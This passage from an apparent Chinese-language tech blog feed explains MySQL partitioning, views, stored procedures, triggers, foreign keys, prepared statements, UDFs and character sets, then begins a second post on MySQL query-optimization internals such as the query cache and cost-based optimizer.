全量扫描数据，不用索引。即只要能够根据 WHERE 条件将需要查询的数据限制在少数分区中，效率是不错的 索引数据，分离热点。如果数据有明显的 “热点”，而且除了这部分数据，其他数据很少被访问到，那么可以将这部分热点数据单独存放在一个分区中，让这个分区的数据能够有机会都缓存在内存中。这样查询就可以只访问一个很小的分区表，能够使用索引，也能够有效的利用缓存。 分区表的优点是优化器可以根据分区函数来过滤一些分区，但很重要的一点是要在WHERE条件中带入分区列，有时候即使看似多余的也要带上，这样就可以让优化器能够过滤掉无须访问的分区，如果没有这些条件，MySQL 就需要让对应的存储引擎访问这个表的所有分区，如果表非常大的话，就可能会非常慢。 上面两个分区策略基于两个非常重要的前提：查询都能够过滤掉很多额外的分区，分区本身并不会带来很多额外的代价。而这两个前提在某些场景下是有问题的，比如： 1、NULL 值会使分区过滤无效 假设按照PARTITION BY RANGE YEAR(order_date)分区，那么所有order_date为 NULL 或者非法值时，记录都会被存放到第一个分区。所以WHERE order_date BETWEEN '2017-05-01' AND '2017-05-31'，这个查询会检查两个分区，而不是我们认为的 2017 年这个分区（会额外的检查第一个分区），是因为YEAR()在接收非法值时会返回 NULL。如果第一个分区的数据量非常大，而且使用全表扫描的策略时，代价会非常大。为了解决这个问题，我们可以创建一个无用的分区，比如：PARTITION p_null values less than (0)。如果插入的数据都是有效的话，第一个分区就是空的。 在 MySQL5.5 以后就不需要这个技巧了，因为可以直接使用列本身而不是基于列的函数进行分区：PARTITION BY RANGE COLUMNS(order_date)。直接使用这个语法可避免这个问题。 2、分区列和索引列不匹配 当分区列和索引列不匹配时，可能会导致查询无法进行分区过滤，除非每个查询条件中都包含分区列。假设在列 a 上定义了索引，而在列 b 上进行分区。因为每个分区都有其独立的索引，所以在扫描列 b 上的索引就需要扫描每一个分区内对应的索引，当然这种速度不会太慢，但是能够跳过不匹配的分区肯定会更好。这个问题看起来很容易避免，但需要注意一种情况就是，关联查询。如果分区表是关联顺序的第 2 张表，并且关联使用的索引与分区条件并不匹配，那么关联时对第一张表中符合条件的每一行都需要访问并搜索第二张表的所有分区（关联查询原理，请参考前一篇文章） 3、选择分区的成本可能很高 分区有很多种类型，不同类型的分区实现方式也不同，所以它们的性能也不尽相同，尤其是范围分区，在确认这一行属于哪个分区时会扫描所有的分区定义，这样的线性扫描效率并不高，所以随着分区数的增长，成本会越来越高。特别是在批量插入数据时，由于每条记录在插入前，都需要确认其属于哪一个分区，如果分区数太大，会造成插入性能的急剧下降。因此有必要限制分区数量，但也不用太过担心，对于大多数系统，100 个左右的分区是没有问题的。 4、打开并锁住所有底层表的成本在某些时候会很高 前面说过，打开并锁住所有底层表并不会对性能有太大的影响，但在某些情况下，比如只需要查询主键，那么锁住的成本相对于主键的查询来说，成本就略高。 5、维护分区的成本可能会很高 新增和删除分区的速度都很快，但是修改分区会造成数据的复制，这与ALTER TABLE的原理类似，需要先创建一个历史分区，然后将数据复制到其中，最后删除原分区。因此，设计数据库时，考虑业务的增长需要，合理的创建分区表是一个非常好的习惯。在 MySQL5.6 以后的版本可以使用ALTER TABLE EXCHAGE PARTITION语句来修改分区，其性能会有很大提升。 分区表还有一些其他限制，比如所有的底层表必须使用相同的存储引擎，某些存储引擎也不支持分区。分区一般应用于一台服务器上，但一台服务器的物理资源总是有限的，当数据达到这个极限时，即使分区，性能也可能会很低，所以这个时候分库是必须的。但不管是分区、分库还是分表，它们的思想都是一样的，大家可以好好体会下。 视图对于一些关联表的复杂查询，使用视图有时候会大大简化问题，因此在许多场合下都可以看到视图的身影，但视图真如我们所想那样简单吗？它和直接使用JOIN的 SQL 语句有何区别？视图背后的原理又了解多少？ 视图本身是一个虚拟表，不存放任何数据，查询视图的数据集由其他表生成。MySQL 底层通过两种算法来实现视图：临时表算法（TEMPTABLE）和合并算法（MERGE）。所谓临时表算法就是将 SELECT 语句的结果存放到临时表中，当需要访问视图的时候，直接访问这个临时表即可。而合并算法则是重写包含视图的查询，将视图定义的 SQL 直接包含进查询 SQL 中。通过两个简单的示例来体会两个算法的差异，创建如下视图：1234-- 视图的作用是查询未支付订单CREATE VIEW unpay_order ASSELECT * FROM sales WHERE status = 'new'WITH CHECK OPTION; -- 其作用下文会讲 现要从未支付订单中查询购买者为csc的订单，可以使用如下查询：12-- 查询购买者为csc且未支付的订单SELECT order_id,order_amount,buyer FROM unpay_order WHERE buyer = 'csc'; 使用临时表来模拟视图：12CREATE TEMPORARY TABLE tmp_order_unpay AS SELECT * FROM sales WHERE status = 'new';SELECT order_id,order_amount,buyer FROM tmp_order_unpay WHERE buyer = 'csc'; 使用合并算法将视图定义的 SQL 合并进查询 SQL 后的样子：1SELECT order_id,order_amount,buyer FROM sales WHERE status = 'new' AND buyer = 'csc'; MySQL 可以嵌套定义视图，即在一个视图上在定义另一个视图，可以在EXPLAIN EXTENDED之后使用SHOW WARNINGS来查看使用视图的查询重写后的结果。如果采用临时表算法实现的视图，EXPLAIN中会显示为派生表（DERIVED），注意EXPLAIN时需要实际执行并产生临时表，所以有可能会很慢。 明显地，临时表上没有任何索引，而且优化器也很难优化临时表上的查询，因此，如有可能，尽量使用合并算法会有更好的性能。那么问题来了：合并算法（类似于直接查询）有更好的性能，为什么还要使用视图？ 首先视图可以简化应用上层的操作，让应用更专注于其所关心的数据。其次，视图能够对敏感数据提供安全保护，比如：对不同的用户定义不同的视图，可以使敏感数据不出现在不应该看到这些数据的用户视图上；也可以使用视图实现基于列的权限控制，而不需要真正的在数据库中创建列权限。再者，视图可以方便系统运维，比如：在重构 schema 的时候使用视图，使得在修改视图底层表结构的时候，应用代码还可以继续运行不报错。 基于此，使用视图其实更多的是基于业务或者维护成本上的考虑，其本身并不会对性能提升有多大作用（注意：此处只是基于 MySQL 考虑，其他关系性数据库中视图可能会有更好的性能，比如ORACLE和MS SQL SERVER都支持物化视图，它们都比 MySQL 视图有更好的性能）。而且使用临时表算法实现的视图，在某些时候性能可能会非常糟糕，比如：123-- 视图的作用是统计每日支出金额，DATE('2017-06-15 12:00:23') = 2017-06-15CREATE VIEW cost_per_day ASSELECT DATE(create_time) AS date,SUM(cost) AS cost FROM costs GROUP BY date; 现要统计每日的收入与支出，有类似于上面的收入表，可以使用如下 SQL：1234SELECT c.date,c.cost,s.amountFROM cost_per_day AS cJOIN sale_per_day AS s USING(date)WHERE date BETWEEN '2017-06-01' AND '2017-06-30' 这个查询中，MySQL 先执行视图的 SQL，生成临时表，然后再将sale_per_day表和临时表进行关联。这里WHERE字句中的BETWEEN条件并不能下推到视图中，因而视图在创建时，会将所有的数据放到临时表中，而不是一个月数据，并且这个临时表也不会有索引。 当然这个示例中的临时表数据不会太大，毕竟日期的数量不会太多，但仍然要考虑生成临时表的性能（如果 costs 表数据过大，GROUP BY有可能会比较慢）。而且本示例中索引也不是问题，通过上一篇我们知道，如果 MySQL 将临时表作为关联顺序中的第一张表，仍然可以使用sale_per_day中的索引。但如果是对两个视图做关联的话，优化器就没有任何索引可以使用，这时就需要严格测试应用的性能是否满足需求。 我们很少会在实际业务场景中去更新视图，因此印象中，视图是不能更新的。但实际上，在某些情况下，视图是可以更新的。可更新视图是指通过更新这个视图来更新视图涉及的相关表，只要指定了合适的条件，就可以更新、删除甚至是向视图中插入数据。通过上文的了解，不难推断出：更新视图的实质就是更新视图关联的表，将创建视图的WHERE子句转化为UPDATE语句的WHERE子句，只有使用合并算法的视图才能更新，并且更新的列必须来自同一个表中。回顾上文创建视图的 SQL 语句，其中有一句：WITH CHECK OPTION，其作用就是表示通过视图更新的行，都必须符合视图本身的WHERE条件定义，不能更新视图定义列以外的列，否则就会抛出check option failed错误。 视图还有一个容易造成误解的地方：“对于一些简单的查询，视图会使用合并算法，而对于一些比较复杂的查询，视图就会使用临时表算法”。但实际上，视图的实现算法是视图本身的属性决定的，跟作用在视图上的 SQL 没有任何关系。那什么时候视图采用临时表算法，什么时候采用合并算法呢？一般来说，只要原表记录和视图中的记录无法建立一一映射的关系时，MySQL 都将使用临时表算法来实现视图。比如创建视图的 SQL 中包含GROUP BY、DISTINCT、UNION、聚合函数、子查询的时候，视图都将采用临时表算法（这些规则在以后的版本中，可能会发生改变，具体请参考官方手册）。 相比于其它关系型数据库的视图，MySQL 的视图在功能上会弱很多，比如ORACLE和MS SQL SERVER都支持物化视图。物化视图是指将视图结果数据存放在一个可以查询的表中，并定期从原始表中刷新数据到这张表中，这张表和普通物理表一样，可以创建索引、主键约束等等，性能相比于临时表会有质的提升。但遗憾的是 MySQL 目前并不支持物化视图，当然 MySQL 也不支持在视图中创建索引。 存储过程与触发器回到第二个问题，有非常多的人在分享时都会抛出这样一个观点：尽可能不要使用存储过程，存储过程非常不容易维护，也会增加使用成本，应该把业务逻辑放到客户端。既然客户端都能干这些事，那为什么还要存储过程？ 如果有深入了解过存储过程，就会发现存储过程并没有大家描述的那么不堪。我曾经经历过一些重度使用存储过程的产品，依赖到什么程度呢？就这么说吧，上层的应用基本上只处理交互与动效的逻辑，所有的业务逻辑，甚至是参数的校验均在存储过程中实现。曾经有出现过一个超大的存储过程，其文件大小达到惊人的 80K，可想而知，其业务逻辑有多么复杂。在大多数人眼中，这样的技术架构简直有点不可理喻，但实际上这款产品非常成功。 其成功的原因在一定程度上得益于存储过程的优点，由于业务层代码没有任何侵入业务的代码，在不改变前端展示效果的同时，可以非常快速的修复 BUG、开发新功能。由于这款产品需要部署在客户的私有环境上，快速响应客户的需求就变得尤为重要，正是得益于这种架构，可以在客户出现问题或者提出新需求时，快速响应，极端情况下，我们可以在 1 小时内修复客户遇到的问题。正是这种快速响应机制，让我们获得大量的客户。 当然存储过程还有其他的优点，比如，可以非常方便的加密存储过程代码，而不用担心应用部署到私有环境造成源代码泄露、可以像调试其他应用程序一样调试存储过程、可以设定存储过程的使用权限来保证数据安全等等。一切都非常美好，但我们的产品是基于MS SQL SERVER实现的，其可以通过T-SQL非常方便的实现复杂的业务逻辑。你可以把T-SQL看做是一门编程语言，其包含SQL的所有功能，还具备流程控制、批处理、定时任务等能力，你甚至可以用其来解析 XML 数据。关于T-SQL的更多信息可以参考MSDN，主流的关系型数据库目前只有MS SQL SERVER支持T-SQL，因此，MySQL 并不具备上文描述的一些能力，比如，MySQL 的存储过程调试非常不方便（当然可以通过付费软件来获得很好的支持）。 除此之外，MySQL 存储过程还有一些其他的限制： 优化器无法评估存储过程的执行成本 每个连接都有独立的存储过程执行计划缓存，如果有多个连接需要调用同一个存储过程，将会浪费缓存空间来缓存相同的执行计划 因此，在 MySQL 中使用存储过程并不是一个太好策略，特别是在一些大数据、高并发的场景下，将复杂的逻辑交给上层应用实现，可以非常方便的扩展已有资源以便获得更高的计算能力。而且对于熟悉的编程语言，其可读性会比存储过程更好一些，也更加灵活。不过，在某些场景下，如果存储过程比其他实现会快很多，并且是一些较小的操作，可以适当考虑使用存储过程。 和存储过程类似的，还有触发器，触发器可以让你在执行INSERT、UPDATE和DELETE时，执行一些特定的操作。在 MySQL 中可以选择在 SQL 执行之前触发还是在 SQL 执行后触发。触发器一般用于实现一些强制的限制，这些限制如果在应用程序中实现会让业务代码变得非常复杂，而且它也可以减少客户端与服务器之间的通信。MySQL 触发器的实现非常简单，所以功能非常有限，如果你在其他数据库产品中已经重度依赖触发器，那么在使用 MySQL 触发器时候需要注意，因为 MySQL 触发器的表现和预想的不一致。 首先对一张表的每一个事件，最多只能定义一个触发器，而且它只支持 “基于行的触发”，也就是触发器始终是针对一条记录的，而不是针对整个 SQL 语句。如果是批量更新的话，效率可能会很低。其次，触发器可以掩盖服务器本质工作，一个简单的 SQL 语句背后，因为触发器，可能包含了很多看不见的工作。再者，触发器出现问题时很难排查。最后，触发器并不一定能保证原子性，比如MyISAM引擎下触发器执行失败了，也不能回滚。在InnoDB表上的触发器是在同一个事务中执行完成的，所以他们的执行是原子的，原操作和触发器操作会同时失败或者成功。 虽然触发器有这么多限制，但它仍有适用的场景，比如，当你需要记录 MySQL 数据的变更日志，这时触发器就非常方便了。 外键约束目前在大多数互联网项目，特别是在大数据的场景下，已经不建议使用外键了，主要是考虑到外键的使用成本： 外键通常要求每次修改数据时都要在另外一张表中执行一次查找操作。在 InnoDB 存储引擎中会强制外键使用索引，但在大数据的情况下，仍然不能忽略外键检查带来的开销，特别是当外键的选择性很低时，会导致一个非常大且选择性低的索引。 如果向子表中插入一条记录，外键约束会让 InnoDB 检查对应的父表的记录，也就需要对父表对应记录进行加锁操作，来确保这条记录不会在这个事务完成之时就被删除了。这会导致额外的锁等待，甚至会导致一些死锁。 高并发场景下，数据库很容易成为性能瓶颈，自然而然的就希望数据库可以水平扩展，这时就需要把数据的一致性控制放到应用层，也就是让应用服务器可以承担压力，这种情况下，数据库层面就不能使用外键。 因此，当不用过多考虑数据库的性能问题时，比如一些内部项目或传统行业项目（其使用人数有限，而且数据量一般不会太大），使用外键是一个不错的选择，毕竟想要确保相关表始终有一致的数据，使用外键要比在应用程序中检查一致性方便简单许多，此外，外键在相关数据的删除和更新操作上也会比在应用中要高效。 绑定变量可能大家看到 “绑定变量” 这个词时，会有一点陌生，换个说法可能会熟悉一些：prepared statement。绑定变量的 SQL，使用问号标记可以接收参数的位置，当真正需要执行具体查询的时候，则使用具体的数值代替这些问号，比如：12345678910111213SELECT order_no, order_amount FROM sales WHERE order_status = ? and buyer = ?``` 为什么要使用绑定变量？总所周知的原因是可以预先编译，减少 SQL 注入的风险，除了这些呢？当创建一个绑定变量 SQL 时，客户端向服务器发送了一个 SQL 语句原型，服务器收到这个 SQL 语句的框架后，解析并存储这个 SQL 语句的部分执行计划，返回给客户端一个 SQL 语句处理句柄，从此以后，客户端通过向服务器发送各个问号的取值和这个句柄来执行一个具体查询，这样就可以更高效地执行大量重复语句，因为：* 服务器只需要解析一次 SQL 语句* 服务器某些优化器的优化工作也只需要做一次，因为 MySQL 会缓存部分执行计划* 通信中仅仅发送的是参数，而不是整个语句，网络开销也会更小，而且以二进制发送参数和句柄要比发送 ASCII 文本的效率更高需要注意的是，MySQL 并不是总能缓存执行计划，如果某些执行计划需要根据参入的参数来计算时，MySQL 就无法缓存这部分执行计划。比如：```bash-- 这里假装有一个例子，大家可以自己思考一下 使用绑定变量的最大陷阱是：你知道其原理，但不知道它是如何实现的。有时候，很难解释如下 3 种绑定变量类型之间的区别： 客户端模拟的绑定变量：客户端的驱动程序接收一个带参数的 SQL，再将参数的值带入其中，最后将完整的查询发送到服务器。 服务器绑定变量：客户端使用特殊的二进制协议将带参数的 SQL 语句发送到服务器端，然后使用二进制协议将具体的参数值发送给服务器并执行。 SQL 接口的绑定变量：客户端先发送一个带参数的 SQL 语句到服务器端，这类似于使用prepared的 SQL 语句，然后发送设置的参数，最后在发送execute指令来执行 SQL，所有这些都是用普通的文本传输协议。 比如某些不支持预编译的 JDBC 驱动，在调用connection.prepareStatement(sql)时，并不会把 SQL 语句发送给数据库做预处理，而是等到调用executeQuery方法时才把整个语句发送到服务器，这种方式就类似于第 1 种情况。因此，在程序中使用绑定变量时，理解你使用的驱动通过哪种方式来实现就显得很有必要。延伸开来说，对于自己使用的框架、开源工具，不应仅仅停留在会使用这个层面，有时间可以深入了解其原理和实现，不然有可能被骗了都不知道哦。 用户自定义函数MySQL 本身内置了非常多的函数，比如SUM、COUNT、AVG等等，可实际应用中，我们常常需要更多。大多数情况下，更强大的功能都是在应用层面实现，但实际上 MySQL 也提供了机会让我们可以去扩展 MySQL 函数，这就是用户自定义函数 (user-defined function)，也称为：UDF。需要注意UDF与存储过程和通过 SQL 创建函数的区别，存储过程只能使用 SQL 来编写，而UDF没有这个限制，可以使用支持 C 语言调用约定的任何编程语言来实现。 UDF必须事先编译好并动态链接到服务器上，这种平台相关性使得UDF在很多方面都很强大，UDF速度非常快，而且可以访问大量操作系统功能，还可以使用大量库函数。如果需要一个 MySQL 不支持的统计聚合函数，并且无法使用存储过程来实现，而且还想不同的语言都可以调用，那么UDF是不错的选择，至少不需要每种语言都来实现相同的逻辑。 所谓能力越大，责任也就越大，UDF中的一个错误可能直接让服务器崩溃，甚至扰乱服务器的内存和数据，因此，使用时需要注意其潜在的风险。在 MySQL 版本升级时也需要注意，因为你可能需要重新编译或者修改这些UDF，以便让它们能在新版本中工作。 这里有一个简单的示例来展示如何创建UDF：将结果集转化为 JSON，具体的代码请参考：lib_mysqludf_json。1234567891011121314151617181920212223242526-- 1、首先使用c语言实现功能-- 2、编译-- 这里省略第1、2步，实现并编译成.so-- 3、使用SQL创建函数DROP FUNCTION json_array;CREATE FUNCTION json_array RETURNS string soname 'lib_mysqludf_json.so';-- 4、使用函数SELECT json_array( customer_id, first_name, last_name, last_update ) as customerFROM customerWHERE customer_id = 1;/*5、得到的结果如下：+------------------------------------------+| customer |+------------------------------------------+| [1,"MARY","SMITH","2006-02-15 04:57:20"] |+------------------------------------------+*/ 其大致的实现流程：使用 C 语言实现逻辑 -> 编译成.so文件 -> 创建函数 -> 使用函数。UDF在实际工作中可能很少使用，但作为开发者的我们，了解这么一款强大的工具，在解决棘手问题时，也让我们有了更多的选择。 字符集最后说说字符集。 关于字符集大多数人的第一印象可能就是：数据库字符集尽量使用UTF8，因为UTF8字符集是目前最适合于实现多种不同字符集之间的转换的字符集，可以最大程度上避免乱码问题，也可以方便以后的数据迁移。But why？ 字符集是指一种从二进制编码到某类字符符号的映射，可以参考如何使用一个字节来表示英文字母。校对规则是指一组用于某个字符集的排序规则，即采用何种规则对某类字符进行排序。MySQL 每一类编码字符都有其对应的字符集和校对规则。MySQL 对各种字符集的支持都非常完善，但同时也带来一些复杂性，某些场景下甚至会有一些性能牺牲。 一种字符集可能对应多种校对规则，且都有一个默认校对规则，那在 MySQL 中是如何使用字符集的？在 MySQL 中可以通过两种方式设置字符集：创建对象时设置默认值、客户端与服务器通信时显式设置。 MySQL 采用 “阶梯” 式的方式来设定字符集默认值，每个数据库，每张表都有自己的默认值，它们逐层继承，最终最靠底层的默认设置将影响你创建的对象。比如，创建数据库时，将根据服务器上的character_set_server来设置数据库的默认字符集，同样的道理，根据database的字符集来指定库中所有表的字符集…… 不管是对数据库，还是表和列，只有当它们没有显式指定字符集时，默认字符集才会起作用。 当客户端与服务器通信时，它们可以使用不同的字符集，这时候服务器将进行必要的转换工作。当客户端向服务器发送请求时，数据以character_set_client设置的字符集进行编码；而当服务器收到客户端的 SQL 或者数据时，会按照character_set_connection设置的字符集进行转换；当服务器将要进行增删改查等操作前会再次将数据转换成character_set_database(数据库采用的字符集，没有单独配置即使用默认配置，具体参考上文)，最后当服务器返回数据或者错误信息时，则将数据按character_set_result设置的字符集进行编码。服务器端可以使用SET CHARACTER SET来改变上面的配置，客户端也可以根据对应的 API 来改变字符集配置。客户端和服务器端都使用正确的字符集才能避免在通信中出现问题。 那如何选择字符集在考虑使用何种字符集时，最主要的衡量因素是存储的内容，在能够满足存储内容的前提下，尽量使用较小的字符集。因为更小的字符集意味着更少空间占用、以及更高的网络传输效率，也间接提高了系统的性能。如果存储的内容是英文字符等拉丁语系字符的话，那么使用默认的latin1字符集完全没有问题（MySQL 8 默认utf8mb4），如果需要存储汉字、俄文、阿拉伯语等非拉丁语系字符，则建议使用UTF8字符集。当然不同字符在使用UTF8字符集所占用的空间是不同的，比如英文字符在UTF8字符集中只使用一个字节，而一个汉字则占用 3 个字节。 除了字符集，校对规则也是我们需要考虑的问题。对于校对规则，一般来说只需要考虑是否以大小写敏感的方式比较字符串或者是否用字符串编码的二进制来比较大小，其对应的校对规则的后缀分别是_cs、_ci和_bin。大小写敏感和二进制校对规则的不同之处在于，二进制校对规则直接使用字符的字节进行比较，而大小写敏感的校对规则在多字节字符集时，如德语，有更复杂的比较规则。举个简单的例子，UTF8字符集对应校对规则有三种： utf8_bin将字符串中的每一个字符用二进制数据存储，区分大小写 utf8_general_ci不区分大小写，ci为case insensitive的缩写，即大小写不敏感 utf8_general_cs区分大小写，cs为case sensitive的缩写，即大小写敏感 比如，创建一张表，使用UTF8编码，且大小写敏感时，可以使用如下语句：12345CREATE TABLE sales ( order_no VARCHAR(32) NOT NULL PRIMARY KEY, order_amount INT NOT NULL DEFAULT 0, ......) ENGINE=InnoDB COLLATE=utf8_general_cs; 因此，在项目中直接使用UTF8字符集是完全没有问题的，但需要记住的是不要在一个数据库中使用多个不同的字符集，不同字符集之间的不兼容问题很难缠。有时候，看起来一切正常，但是当某个特殊字符出现时，一切操作都会出错，而且你很难发现错误的原因。 字符集对数据库的性能有影响吗某些字符集和校对规则可能会需要多个的 CPU 操作，可能会消耗更多的内存和存储空间，这点在前文已经说过。特别是在同一个数据库中使用不同的字符集，造成的影响可能会更大。 不同字符集和校对规则之间的转换可能会带来额外的系统开销，比如，数据表sales在buyer字段上有索引，则可以加速下面的ORDER BY操作：1SELECT order_no,order_amount FROM sales ORDER BY buyer; 只有当 SQL 查询中排序要求的字符集与服务器数据的字符集相同时，才能使用索引进行排序。你可能会说，这不是废话吗？其实不然，MySQL 是可以单独指定排序时使用的校对规则的，比如：123-- 你说，这不是吃饱了撑的吗？我觉得也是，也许会有其适用的场景吧-- 这时候就不能使用索引排序呢，只能使用文件排序SELECT order_no,order_amount FROM sales ORDER BY buyer COLLATE utf8_bin; 当使用两个字符集不同的列来关联两张表时，MySQL 会尝试转换其中一个列的字符集。这和在数据列外面封装一个函数一样，会让 MySQL 无法使用这个列上的索引。关于 MySQL 字符集还有一些坑，但在实际应用场景中遇到的字符集问题，其实不是特别的多，所以就此打住。 结语MySQL 还有一些其他高级特性，但在大多数场景下我们很少会使用，因此这里也没有讨论，但多了解一些总是好的，至少在需要的时候，你知道有这样一个东西。我们非常多的人，总是会认为自己所学的知识就像碎片一样不成体系，又找不到解决办法，那你有没有想过也许是碎片不够多的缘故？点太少，自然不能连接成线，线太少，自然不能结成网。因而，没有其他办法，保持好奇心、多学习、多积累，量变总有一天会质变。 前面我写的一些文章里面会有提到过，架构设计是一种平衡的艺术，其实质应该是一种妥协，是对现有资源的一种妥协。有时候我们会不自觉的陷入某一个点，比如，为了追求数据的扩展性，很多人一上来就开始分库分表，然后把应用搞得非常复杂，到最后表里还没有装满数据，项目就已经死了。所以在资源有限或者未来还不可知的情况下，尽量使用数据库、语言本身的特性来完成相应的工作，是不是会更好一点。解决大数据问题，也不只是分库分表，你还应该还可以想到分区；有些业务即使在分布式环境下也不一定非要在业务层完成，合理使用存储过程和触发器或者使用自己根据分表分库规则的小工具也许会让你更轻松…… 参考资料高性能 MySQL(第 3 版) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 优化原理(一)]]></title>
    <url>%2F2019%2F03%2F29%2Fmysql-optimization-principle-1%2F</url>
    <content type="text"><![CDATA[扫地只不过是我di表面工作，我真正di身份是一位研究——僧。 前言说起 MySQL 的查询优化，相信大家收藏了一堆奇技淫巧：不能使用SELECT *、不使用 NULL 字段、合理创建索引、为字段选择合适的数据类型…… 你是否真的理解这些优化技巧？是否理解其背后的工作原理？在实际场景下性能真有提升吗？我想未必。因而理解这些优化建议背后的原理就尤为重要，希望本文能让你重新审视这些优化建议，并在实际业务场景下合理的运用。 MySQL 逻辑架构如果能在头脑中构建一幅 MySQL 各组件之间如何协同工作的架构图，有助于深入理解 MySQL 服务器。下图展示了 MySQL 的逻辑架构图。 MySQL 逻辑架构整体分为三层，最上层为客户端层，并非 MySQL 所独有，诸如：连接处理、授权认证、安全等功能均在这一层处理。 MySQL 大多数核心服务均在中间这一层，包括查询解析、分析、优化、缓存、内置函数 (比如：时间、数学、加密等函数)。所有的跨存储引擎的功能也在这一层实现：存储过程、触发器、视图等。 最下层为存储引擎，其负责 MySQL 中的数据存储和提取。和 Linux 下的文件系统类似，每种存储引擎都有其优势和劣势。中间的服务层通过 API 与存储引擎通信，这些 API 接口屏蔽了不同存储引擎间的差异。 MySQL 查询过程我们总是希望 MySQL 能够获得更高的查询性能，最好的办法是弄清楚 MySQL 是如何优化和执行查询的。一旦理解了这一点，就会发现：很多的查询优化工作实际上就是遵循一些原则让 MySQL 的优化器能够按照预想的合理方式运行而已。 当向 MySQL 发送一个请求的时候，MySQL 到底做了些什么呢？ 客户端 / 服务端通信协议MySQL 客户端 / 服务端通信协议是 “半双工” 的：在任一时刻，要么是服务器向客户端发送数据，要么是客户端向服务器发送数据，这两个动作不能同时发生。一旦一端开始发送消息，另一端要接收完整个消息才能响应它，所以我们无法也无须将一个消息切成小块独立发送，也没有办法进行流量控制。 客户端用一个单独的数据包将查询请求发送给服务器，所以当查询语句很长的时候，需要设置max_allowed_packet参数。但是需要注意的是，如果查询实在是太大，服务端会拒绝接收更多数据并抛出异常。 与之相反的是，服务器响应给用户的数据通常会很多，由多个数据包组成。但是当服务器响应客户端请求时，客户端必须完整的接收整个返回结果，而不能简单的只取前面几条结果，然后让服务器停止发送。因而在实际开发中，尽量保持查询简单且只返回必需的数据，减小通信间数据包的大小和数量是一个非常好的习惯，这也是查询中尽量避免使用SELECT *以及加上LIMIT限制的原因之一。 查询缓存在解析一个查询语句前，如果查询缓存是打开的，那么 MySQL 会检查这个查询语句是否命中查询缓存中的数据。如果当前查询恰好命中查询缓存，在检查一次用户权限后直接返回缓存中的结果。这种情况下，查询不会被解析，也不会生成执行计划，更不会执行。 MySQL 将缓存存放在一个引用表（不要理解成table，可以认为是类似于HashMap的数据结构），通过一个哈希值索引，这个哈希值通过查询本身、当前要查询的数据库、客户端协议版本号等一些可能影响结果的信息计算得来。所以两个查询在任何字符上的不同（例如：空格、注释），都会导致缓存不会命中。 如果查询中包含任何用户自定义函数、存储函数、用户变量、临时表、MySQL 库中的系统表，其查询结果都不会被缓存。比如函数NOW()或者CURRENT_DATE()会因为不同的查询时间，返回不同的查询结果，再比如包含CURRENT_USER或者CONNECION_ID()的查询语句会因为不同的用户而返回不同的结果，将这样的查询结果缓存起来没有任何的意义。 既然是缓存，就会失效，那查询缓存何时失效呢？MySQL 的查询缓存系统会跟踪查询中涉及的每个表，如果这些表（数据或结构）发生变化，那么和这张表相关的所有缓存数据都将失效。正因为如此，在任何的写操作时，MySQL 必须将对应表的所有缓存都设置为失效。如果查询缓存非常大或者碎片很多，这个操作就可能带来很大的系统消耗，甚至导致系统僵死一会儿。而且查询缓存对系统的额外消耗也不仅仅在写操作，读操作也不例外： 任何的查询语句在开始之前都必须经过检查，即使这条 SQL 语句永远不会命中缓存 如果查询结果可以被缓存，那么执行完成后，会将结果存入缓存，也会带来额外的系统消耗 基于此，我们要知道并不是什么情况下查询缓存都会提高系统性能，缓存和失效都会带来额外消耗，只有当缓存带来的资源节约大于其本身消耗的资源时，才会给系统带来性能提升。但要如何评估打开缓存是否能够带来性能提升是一件非常困难的事情，也不在本文讨论的范畴内。如果系统确实存在一些性能问题，可以尝试打开查询缓存，并在数据库设计上做一些优化，比如： 用多个小表代替一个大表，注意不要过度设计 批量插入代替循环单条插入 合理控制缓存空间大小，一般来说其大小设置为几十兆比较合适 可以通过SQL_CACHE和SQL_NO_CACHE来控制某个查询语句是否需要进行缓存 最后的忠告是不要轻易打开查询缓存，特别是写密集型应用。如果你实在是忍不住，可以将query_cache_type设置为DEMAND，这时只有加入SQL_CACHE的查询才会走缓存，其他查询则不会，这样可以非常自由地控制哪些查询需要被缓存。 当然查询缓存系统本身是非常复杂的，这里讨论的也只是很小的一部分，其他更深入的话题，比如：缓存是如何使用内存的？如何控制内存的碎片化？事务对查询缓存有何影响等等，读者可以自行阅读相关资料，这里权当抛砖引玉吧。 语法解析和预处理MySQL 通过关键字将 SQL 语句进行解析，并生成一颗对应的解析树。这个过程解析器主要通过语法规则来验证和解析。比如 SQL 中是否使用了错误的关键字或者关键字的顺序是否正确等等。预处理则会根据 MySQL 规则进一步检查解析树是否合法。比如检查要查询的数据表和数据列是否存在等等。 查询优化经过前面的步骤生成的语法树被认为是合法的了，并且由优化器将其转化成查询计划。多数情况下，一条查询可以有很多种执行方式，最后都返回相应的结果。优化器的作用就是找到这其中最好的执行计划。 MySQL 使用基于成本的优化器，它尝试预测一个查询使用某种执行计划时的成本，并选择其中成本最小的一个。在 MySQL 可以通过查询当前会话的last_query_cost的值来得到其计算当前查询的成本。123456789mysql> select * from t_message limit 10;...省略结果集mysql> show status like 'last_query_cost';+-----------------+-------------+| Variable_name | Value |+-----------------+-------------+| Last_query_cost | 6391.799000 |+-----------------+-------------+ 示例中的结果表示优化器认为大概需要做 6391 个数据页的随机查找才能完成上面的查询。这个结果是根据一些列的统计信息计算得来的，这些统计信息包括：每张表或者索引的页面个数、索引的基数、索引和数据行的长度、索引的分布情况等等。 有非常多的原因会导致 MySQL 选择错误的执行计划，比如统计信息不准确、不会考虑不受其控制的操作成本（用户自定义函数、存储过程）、MySQL 认为的最优跟我们想的不一样（我们希望执行时间尽可能短，但 MySQL 只选择它认为成本小的，但成本小并不意味着执行时间短）等等。 MySQL 的查询优化器是一个非常复杂的部件，它使用了非常多的优化策略来生成一个最优的执行计划： 重新定义表的关联顺序（多张表关联查询时，并不一定按照 SQL 中指定的顺序进行，但有一些技巧可以指定关联顺序） 优化MIN()和MAX()函数（找某列的最小值，如果该列有索引，只需要查找 B+Tree 索引最左端，反之则可以找到最大值，具体原理见下文） 提前终止查询（比如：使用 Limit 时，查找到满足数量的结果集后会立即终止查询） 优化排序（在老版本 MySQL 